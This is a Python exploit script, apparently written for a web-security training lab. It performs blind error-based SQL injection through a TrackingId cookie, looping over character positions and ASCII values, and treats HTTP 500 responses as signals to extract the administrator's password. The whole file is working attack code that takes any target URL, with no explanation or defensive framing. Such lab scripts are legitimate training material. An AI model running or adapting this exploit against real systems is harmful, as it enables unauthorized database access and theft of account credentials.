import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'HNgGaYD4kd21vAwI' + sqli_payload_encoded, 'session': '7NHNzbihLS8B2w9QnqWRpgIzZ0yAIfwi'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("Retreiving administrator password...")
    sqli_password(url)
    

if __name__=="__main__":
    main()